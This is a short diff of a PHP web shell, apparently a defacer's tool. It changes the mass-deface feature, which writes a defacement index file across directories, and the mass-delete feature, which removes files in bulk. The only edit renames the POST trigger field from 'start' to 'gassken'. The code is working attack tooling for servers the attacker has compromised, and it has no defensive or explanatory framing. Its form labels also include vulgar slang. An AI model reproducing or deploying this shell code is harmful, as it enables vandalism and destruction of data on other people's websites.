@@ -227,7 +227,7 @@ if($_GET['to'] == 'mass') {
 			}
 		}
 	}
-	if($_POST['start']) {
+	if($_POST['gassken']) {
 		if($_POST['tipe_sabun'] == 'mahal') {
 			echo "<div style='margin: 5px auto; padding: 5px'>";
 			sabun_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
@@ -248,7 +248,7 @@ if($_GET['to'] == 'mass') {
 	<input type='text' name='d_file' value='ini.html' style='width: 450px;' height='10'><br>
 	<font style='text-decoration: underline;'>Index File:</font><br>
 	<textarea name='script' style='width: 450px; height: 200px;'>$ .: SWEET TOUCH BY Z4PHY :. $</textarea><br>
-	<input type='submit' name='start' value='ENTOT COK!' style='width: 450px;'>
+	<input type='submit' name='gassken' value='ENTOT COK!' style='width: 450px;'>
 	</form></center>";
 	} 
 	} elseif($_GET['to'] == 'masse') {
@@ -280,7 +280,7 @@ if(is_writable($dir)) {
    }
 }
    }
-   if($_POST['start']) {
+   if($_POST['gassken']) {
 echo "<div style='margin: 5px auto; padding: 5px'>";
 hapus_massal($_POST['d_dir'], $_POST['d_file']);
 echo "</div>";
@@ -291,7 +291,7 @@ echo "</div>";
    <input type='text' name='d_dir' value='$path' style='width: 450px;' height='10'><br>
    <font>Filename :</font><br>
    <input type='text' name='d_file' value='nyawa lu aja mass delete gan:v' style='width: 450px;' height='10'><br>
-   <input type='submit' name='start' value='Mass Delete' style='width: 450px;'>
+   <input type='submit' name='gassken' value='Mass Delete' style='width: 450px;'>
    </form></center>";
    }
    //BATAS
